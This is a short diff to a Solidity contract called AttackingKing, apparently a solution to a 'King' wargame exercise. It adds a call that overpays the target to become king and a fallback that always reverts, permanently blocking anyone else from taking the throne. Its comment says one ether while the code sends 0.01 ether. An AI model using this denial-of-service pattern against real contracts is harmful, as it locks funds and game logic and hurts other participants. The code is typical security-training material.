@@ -11,6 +11,12 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        // Code me!
+        // Code me! send current king value plus one eth to become new king
+        address(contractAddress).call{value: (address(contractAddress).balance + .01 ether)}("");
+    }
+
+    // any tx that tries to pay this attacking king contract will fail, so the person can't take over as king
+    fallback() external payable {
+        revert();
     }
 }
